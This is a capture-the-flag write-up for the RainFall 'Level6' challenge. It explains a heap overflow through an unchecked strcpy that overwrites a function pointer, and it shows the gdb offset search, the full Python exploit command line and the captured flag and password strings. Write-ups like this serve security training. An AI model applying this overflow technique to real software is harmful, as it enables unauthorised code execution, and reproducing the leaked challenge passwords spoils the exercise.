# **Level6**

## **Analysis**

**In `main()`:**

```c
// Malloc of a String of length 64
str = (char *)malloc(0x40); // 64
// And just afterward, a malloc for a pointer to function
fct = (void **)malloc(0x4);

// pointer to function `m()` assigned
fct = &m;
// Unprotected `strcpy`
strcpy(str, av[1]);

// Call to the pointer to function which by default is `m()`
fct();
```

**In `m()`:**

Nothing interesting

**In `n()`:**

System call to print the `.pass`

___

## **Exploit**

If we change the pointer to function from `m()` adress -> `n()` adress using the `strcpy()`,
That'll do it

First lets determine the Offset :
```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()

 ❯ python3 offset.py 53
72
```

What's the adress to `n()` ?
```
(gdb) info function
All defined functions:
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

So the solution is:
 * (72) Offset of 72 characters
 * (04) Adress of `n()`

```
level6@RainFall:~$ ./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

___

*Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31*